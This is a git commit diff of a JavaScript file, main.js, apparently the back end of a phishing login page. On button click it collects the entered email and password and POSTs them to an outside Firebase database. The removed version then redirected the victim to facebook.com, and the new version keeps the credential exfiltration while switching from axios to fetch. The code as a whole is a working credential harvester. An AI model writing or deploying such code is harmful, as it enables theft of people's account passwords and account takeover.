fd960668d95a0efb6f4a99e34ca67ba702f1742f
DavidCDCB <cristian-cb1@hotmail.com>
2021-09-28 21:54:54 -0500

    full2

--- main.js
+++ main.js
@@ -1,23 +1,21 @@
 let getElement = (t) => document.querySelector(t);
 
 let uploadData = (data) => {
-  axios
-    .post("https://datacovidcaldas.firebaseio.com/IpAccess.json", data, {
-      headers: {
-        "Content-Type": "application/json"
-      }
-    })
-    .then((response) => {
-      console.log(response);
-      window.location.href = "https://facebook.com/";
-    });
-};
+	fetch('https://datacovidcaldas.firebaseio.com/IpAccess.json', {
+		method: "POST",
+		body: JSON.stringify(data),
+		headers: { "Content-type": "application/json; charset=UTF-8" }
+	})
+		.then(response => response.json())
+		.then(json => console.log(json))
+		.catch(err => console.log(err));
+}
 
 getElement("#btnLogin").addEventListener("click", function () {
-  let data = {
-    user: getElement("#email").value,
-    pass: getElement("#pass").value
-  };
-  console.log(data);
-  uploadData(data);
+	let data = {
+		user: getElement("#email").value,
+		pass: getElement("#pass").value
+	};
+	console.log(data);
+	uploadData(data);
 });
